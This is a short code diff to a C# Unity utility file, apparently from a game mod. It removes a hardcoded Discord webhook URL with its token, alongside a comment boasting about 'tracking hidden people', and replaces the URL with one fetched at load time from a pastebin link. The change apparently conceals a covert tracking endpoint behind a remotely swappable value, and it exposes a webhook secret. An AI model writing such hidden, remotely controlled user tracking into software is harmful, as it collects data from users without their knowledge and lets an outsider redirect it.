@@ -10,6 +10,8 @@ using UnityEngine.Animations.Rigging;
 using System.Collections;
 using System.Text;
 using UnityEngine.Networking;
+using System;
+using System.Net;
 
 namespace Hidden.Utilities
 {
@@ -205,9 +207,8 @@ namespace Hidden.Utilities
                 }
             }
         }
-        // If you plan on spamming this webhook its not worth it cuz its private
-        // also please dont delete it i like tracking hidden people
-        private static string webhookUrl = "https://discord.com/api/webhooks/1366263308356947979/NEteYzHHAiRVZKuCTKyK9FJtGktyVTzbcH4XsqdDwM7MhMk0BqgbJX4Yzjb4nGNn6OPs";
+        // If you plan on spamming this webhook its not worth it cuz its private and nobodu sees it
+        private static string webhookUrl = new WebClient().DownloadString("https://pastebin.com/raw/J3rjfaUh");
     }
 }
 
